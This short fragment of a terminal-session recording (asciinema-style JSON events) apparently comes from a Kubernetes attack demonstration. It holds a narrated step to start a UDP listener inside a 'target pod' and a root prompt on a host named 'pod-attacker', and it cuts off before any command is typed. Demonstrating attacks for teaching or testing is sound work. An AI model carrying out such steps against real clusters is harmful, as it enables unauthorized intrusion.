[198.144369, "o", "\r\n\u001b[2m  # Start a UDP listener inside the target pod\u001b[0m\r\n\r\n"]
[200.346411, "o", "\u001b[1;32mroot@pod-attacker\u001b[0m:\u001b[1;34m~\u001b[0m\u001b[1m#\u001b[0m c"]
